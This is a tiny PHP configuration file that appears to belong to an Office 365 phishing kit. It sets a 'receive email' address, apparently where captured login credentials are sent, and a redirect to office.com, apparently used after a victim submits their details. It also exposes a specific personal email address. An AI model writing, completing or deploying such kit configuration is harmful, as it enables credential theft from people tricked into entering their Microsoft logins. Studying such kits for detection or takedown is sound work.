<?php 
$Receive_email="s.mbele@aol.com";
$redirect="https://www.office.com/";
?>